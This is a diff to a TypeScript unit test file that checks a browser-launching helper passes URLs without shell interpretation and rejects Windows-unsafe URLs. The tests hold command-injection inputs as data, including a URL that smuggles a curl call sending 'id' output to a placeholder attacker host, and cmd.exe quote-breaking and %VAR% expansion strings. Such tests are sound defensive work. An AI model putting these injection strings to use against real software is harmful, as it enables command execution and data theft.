@@ -142,14 +142,36 @@ describe('CommonUtils', () => {
         const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({ stdout: '', stderr: '' });
         await CommonUtils.launchUrlInDesktopBrowser(url);
         // The URL must be passed as an inert argv element, never concatenated into a shell string.
-        expect(stub.firstCall.args[1] as string[]).to.include(url);
+        // On Windows the cmd.exe `start` builtin needs the URL double-quoted (see launchUrlInDesktopBrowser).
+        const expected = process.platform === 'win32' ? `"${url}"` : url;
+        expect(stub.firstCall.args[1] as string[]).to.include(expected);
     });
 
     it('does not route a malicious URL through a shell when opening the desktop browser', async () => {
         const malicious = 'http://x/; curl http://attacker/$(id); #';
         const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({ stdout: '', stderr: '' });
         await CommonUtils.launchUrlInDesktopBrowser(malicious);
-        expect(stub.firstCall.args[1] as string[]).to.include(malicious);
+        const expected = process.platform === 'win32' ? `"${malicious}"` : malicious;
+        expect(stub.firstCall.args[1] as string[]).to.include(expected);
+    });
+
+    it('rejects a URL that cannot be safely opened on Windows', async function () {
+        if (process.platform !== 'win32') {
+            this.skip(); // the embedded-quote / %VAR% guard is Windows-only; POSIX passes the URL to open/xdg-open inertly
+        }
+        // An embedded `"` closes cmd.exe's quote context; `%VAR%` is expanded even inside quotes.
+        stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({ stdout: '', stderr: '' });
+        for (const unsafe of ['http://x/?a="&calc', 'http://x/?a=%USERPROFILE%']) {
+            let thrown: Error | undefined;
+            try {
+                // eslint-disable-next-line no-await-in-loop
+                await CommonUtils.launchUrlInDesktopBrowser(unsafe);
+            } catch (error) {
+                thrown = error as Error;
+            }
+            expect(thrown, `expected rejection for ${unsafe}`).to.be.an('error');
+            expect(thrown?.message).to.match(/cannot be safely opened on Windows/);
+        }
     });
 
     it('Promise resolves before timeout', async () => {
